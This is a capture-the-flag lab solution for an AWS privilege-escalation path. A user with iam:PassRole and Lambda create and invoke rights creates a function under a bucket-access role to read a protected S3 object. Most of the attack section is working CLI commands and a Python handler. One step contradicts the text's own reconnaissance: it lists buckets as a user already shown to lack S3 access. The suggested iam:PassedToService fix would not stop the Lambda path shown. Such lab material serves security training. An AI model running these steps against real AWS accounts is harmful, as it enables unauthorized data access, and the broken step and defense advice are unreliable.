# Solution: Lambda Function Creation + Invocation to Bucket

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to Lambda, create Lambda functions, and invoke them — and the role being passed has S3 bucket access. The attacker creates a Lambda function with the bucket-access role as its execution role, writes a handler that reads the flag directly from the target bucket, and invokes the function to retrieve the flag value in the response.

The technique is subtle because the attacker never directly holds `s3:GetObject` at any point. They borrow the S3 access through a Lambda execution environment — a compute context that AWS's IAM system treats as fully legitimate. There are no SCP violations, no trust policy bypasses, and no errors in CloudTrail beyond the expected API calls. From AWS's perspective, a Lambda function with the appropriate execution role read an object from a bucket it had permission to access.

In production environments, this pattern appears when developers are granted broad Lambda management permissions to deploy or debug functions, and a PassRole condition is either missing or scoped too loosely. The combination of `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` is a well-documented privilege escalation path — but the to-bucket variant is often overlooked because the blast radius appears limited compared to full admin escalation. In practice, a single sensitive bucket can contain everything an attacker needs.

## The Challenge

You start as the IAM user `pl-prod-lambda-001-to-bucket-starting-user`. This user has a narrow but dangerous permission set:

- `iam:PassRole` scoped to `pl-prod-lambda-001-to-bucket-target-role`
- `lambda:CreateFunction` on all resources
- `lambda:InvokeFunction` on all resources

Your goal is to read `flag.txt` from `pl-prod-lambda-001-to-bucket-{account_id}-{suffix}`. You cannot access that bucket directly — your starting user has no S3 permissions at all. But the target role (`pl-prod-lambda-001-to-bucket-target-role`) does have `s3:GetObject` and `s3:ListBucket` on it, and you can pass that role to Lambda.

## Reconnaissance

Confirm your identity and verify you lack direct S3 access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-bucket-starting-user

aws s3 ls
# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Good — the starting user is locked out of S3. Now use your helpful permissions to identify the target role and bucket:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `lambda-001-to-bucket`)].{Name:RoleName,Arn:Arn}' \
  --output table
```

You should see `pl-prod-lambda-001-to-bucket-target-role`. Inspect its policies to understand what S3 access it holds:

```bash
aws iam list-attached-role-policies \
  --role-name pl-prod-lambda-001-to-bucket-target-role

aws iam list-role-policies \
  --role-name pl-prod-lambda-001-to-bucket-target-role
```

The attached or inline policy grants `s3:GetObject` and `s3:ListBucket` on `pl-prod-lambda-001-to-bucket-*`. That is your target bucket prefix. Now you know what role to pass and why.

## Exploitation

The attack is a three-step sequence: write a handler, create the function, invoke it.

### Step 1: Write the flag-extraction Lambda handler

Create a Python handler that uses the execution role's credentials (automatically injected into the Lambda runtime by AWS) to read `flag.txt` from the target bucket:

```bash
TARGET_BUCKET=$(aws s3api list-buckets \
  --query "Buckets[?starts_with(Name, 'pl-prod-lambda-001-to-bucket-')].Name" \
  --output text)

cat > /tmp/lambda_function.py << EOF
import json, boto3, os

def lambda_handler(event, context):
    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
    s3 = boto3.client('s3')
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = obj['Body'].read().decode('utf-8')
    return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
EOF

cd /tmp && zip -q lambda_function.zip lambda_function.py
```

The handler does not need to manage credentials explicitly. The Lambda execution environment receives temporary credentials for whatever role is attached as the execution role. When this function runs as `pl-prod-lambda-001-to-bucket-target-role`, `boto3.client('s3')` will automatically use those credentials.

### Step 2: Create the Lambda function with the bucket-access execution role

This is the privilege escalation moment. By specifying the target role as the `--role`, you exercise `iam:PassRole` — delegating an IAM identity you don't directly hold to a compute resource you're creating:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-bucket-target-role"

aws lambda create-function \
    --function-name pl-lambda-001-to-bucket-extractor \
    --runtime python3.11 \
    --role "$TARGET_ROLE_ARN" \
    --handler lambda_function.lambda_handler \
    --zip-file fileb:///tmp/lambda_function.zip \
    --timeout 30
```

Lambda accepts the request and binds the bucket-access role to the function. From this point forward, every invocation of this function runs as `pl-prod-lambda-001-to-bucket-target-role`.

### Step 3: Wait for the function to become active

Lambda needs a moment to initialize the execution environment:

```bash
aws lambda wait function-active \
    --function-name pl-lambda-001-to-bucket-extractor
```

### Step 4: Invoke the function and retrieve the flag

```bash
aws lambda invoke \
    --function-name pl-lambda-001-to-bucket-extractor \
    --payload '{}' \
    /tmp/response.json

cat /tmp/response.json | jq -r '.body' | jq -r '.flag'
```

The Lambda function reads `flag.txt` from the target bucket using the execution role's `s3:GetObject` permission and returns the contents in the response body. The flag value appears in stdout.

## Verification

The Lambda invocation response confirms the attack worked. You can also verify bucket access directly if you first extract the temporary credentials from the Lambda execution environment (as in the to-admin variant) — but for this to-bucket path, the flag is delivered directly in the function response, so no credential extraction step is needed.

If the invocation returns a `200` status and the body contains the flag, the privilege escalation is complete. You read `flag.txt` from a bucket your starting user could never access directly.

## Capture the Flag

The flag is the contents of `flag.txt` in the target S3 bucket. In this scenario, the Lambda function reads and returns it for you directly in the invocation response. Parse it from the response body:

```bash
cat /tmp/response.json | jq -r '.body' | jq -r '.flag'
```

Alternatively, if you want to retrieve the flag in the standard to-bucket form, extract the execution role credentials from the Lambda environment (as in the to-admin variant) and use them to run:

```bash
aws s3 cp s3://pl-prod-lambda-001-to-bucket-{account_id}-{suffix}/flag.txt -
```

The bucket-access role's `s3:GetObject` permission grants access to the flag object. The Lambda function you created is the mechanism that makes those permissions reachable from your unprivileged starting user.

## What Happened

Starting from a user with no S3 access, you used three permissions — `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` — to read a protected S3 object without ever directly holding `s3:GetObject`. The Lambda execution environment acted as a privileged intermediary: it ran as a role with bucket access, retrieved the flag on your behalf, and handed it back in the HTTP-style response.

This is the to-bucket variant of the classic PassRole + Lambda escalation path. It matters because security teams sometimes deprioritize non-admin escalation paths, reasoning that reading one bucket is less impactful than gaining full admin. In practice, that bucket may contain credentials, customer data, or secrets that are themselves worth more than the admin flag. Any sensitive data store reachable by a passable role should be treated as a blast-radius target of a PassRole misconfiguration.

The defense is a single IAM condition: `iam:PassedToService` restricts which AWS services a role may be passed to. Roles that only need to run Lambda functions can be constrained so they cannot be passed to EC2, ECS, or Glue. Roles with sensitive data access should also carry an explicit trust policy condition preventing attachment to attacker-created functions. Without these guardrails, `iam:PassRole` is effectively an indirect `s3:GetObject` (or worse) for any role it can target.
